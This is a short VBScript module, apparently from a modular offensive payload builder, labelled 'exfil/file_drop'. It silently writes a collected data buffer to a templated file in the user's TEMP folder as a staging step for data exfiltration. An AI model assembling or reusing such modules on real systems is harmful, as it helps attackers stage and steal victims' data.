' chunk: exfil/file_drop
' depends: core/emit_buffer, core/file_ops
' provides: exfil_file
' format: vbscript

Sub exfil_file()
    On Error Resume Next
    Dim outPath, f
    outPath = _s.ExpandEnvironmentStrings("%TEMP%") & "\{{EXFIL_FILENAME}}"
    Set f = _fso.CreateTextFile(outPath, True)
    f.Write _buf
    f.Close
    On Error GoTo 0
End Sub
